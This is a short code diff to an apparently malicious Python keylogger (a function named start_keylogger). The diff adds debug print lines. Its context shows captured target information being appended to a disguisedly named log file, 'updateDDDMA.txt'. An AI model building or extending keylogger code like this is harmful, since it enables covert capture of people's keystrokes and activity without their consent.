@@ -120,6 +120,7 @@ def start_keylogger():
             if os.path.exists(main_dir_path) == False:
                 os.mkdir(main_dir_path)
             with open(main_dir_path+"\\updateDDDMA.txt", "w") as e:
+                print("made1")
                 e.close()
 
     def subprocess_commands():
@@ -298,6 +299,7 @@ def start_keylogger():
             with open(main_dir_path+"\\updateDDDMA.txt", "a", encoding="utf-8") as file:
                 file.write(
                     f"\n${final_target_info}\n----------------------------------------------------------------------")
+                print("made2")
                 file.close()
         except FileNotFoundError:
             establish_dir()
@@ -305,6 +307,7 @@ def start_keylogger():
             with open(main_dir_path+"\\updateDDDMA.txt", "a", encoding="utf-8") as file:
                 file.write(
                     f"\n${final_target_info}\n----------------------------------------------------------------------")
+                print("made3")
                 file.close()
         window_log = []
         keys_pressed = []
